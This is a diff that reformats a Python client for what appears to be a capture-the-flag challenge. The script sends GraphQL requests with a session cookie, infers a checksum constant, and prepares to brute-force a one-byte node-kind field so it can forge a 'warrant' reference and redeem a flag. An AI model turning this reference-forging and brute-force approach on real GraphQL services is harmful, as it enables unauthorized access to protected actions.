@@ -44,8 +44,11 @@ class Client:
 
     def gql(self, query, variables=None):
         body = json.dumps({"query": query, "variables": variables or {}}).encode()
-        req = urllib.request.Request(self.base + "/graphql", data=body,
-                                     headers={"Content-Type": "application/json"})
+        req = urllib.request.Request(
+            self.base + "/graphql",
+            data=body,
+            headers={"Content-Type": "application/json"},
+        )
         if self.cookie:
             req.add_header("Cookie", "atlas_session=" + self.cookie)
         try:
@@ -112,7 +115,9 @@ def main():
     print(f"[*] inferred checksum constant C = {C:#04x}")
 
     # sanity: replaying a real (non-warrant) ref is rejected on kind
-    j = c.gql("mutation($w:NodeRef!){ redeemWarrant(warrant:$w){ flag } }", {"w": me_id})
+    j = c.gql(
+        "mutation($w:NodeRef!){ redeemWarrant(warrant:$w){ flag } }", {"w": me_id}
+    )
     print("[*] wrong-kind replay rejected:", j["errors"][0]["message"])
 
     # 5. The WARRANT kind byte is not returned by any field -> brute the 1 byte
